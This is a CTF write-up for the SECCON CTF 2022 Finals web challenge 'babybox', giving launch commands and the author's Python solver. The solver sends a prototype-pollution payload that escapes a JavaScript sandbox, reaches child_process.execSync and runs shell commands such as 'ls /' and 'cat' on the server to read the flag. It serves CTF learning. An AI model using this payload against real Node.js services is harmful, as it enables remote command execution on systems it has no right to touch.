---
title: "Babybox - SECCON CTF 2022 Finals 2023"
category: "web"
subcategory: "prototype-pollution"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "prototype-pollution", "babybox", "web", "seccon-ctf-2022-finals"]
summary: "Can you hack this sandbox?"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/babybox"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Finals"
  year: 2023
  challenge: "Babybox"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/babybox>
- **CTF:** SECCON CTF 2022 Finals 2023

---

# [web] babybox

## Description

Can you hack this sandbox?

- `http://babybox.{int,dom}.seccon.games:3000`

## Attachments

- [babybox](files/babybox)

## Usage

Launch a challenge server:

```
cd build
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_HOST=localhost \
    -e SECCON_PORT=3000 \
    --network=host \
    (docker build -q ./solver)
```


## Solver: `solver.py`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/babybox/solver/solver.py>

```python
import os
import httpx

BASE_URL = f"http://{os.getenv('SECCON_HOST')}:{os.getenv('SECCON_PORT')}"


def evaluate(command: str) -> str:
    res = httpx.post(
        f"{BASE_URL}/calc",
        json={
            "expr": f'o = constructor; o.assign(__proto__, o.getOwnPropertyDescriptor(o.getPrototypeOf(toString), "constructor")); f = value("return global.process.mainModule.constructor._load(`child_process`).execSync(`{command}`).toString()"); f()'
        },
    )
    return res.text


files = evaluate("ls /").splitlines()
for file in files:
    if file.startswith("flag-"):
        print(evaluate(f"cat /{file}"))
```
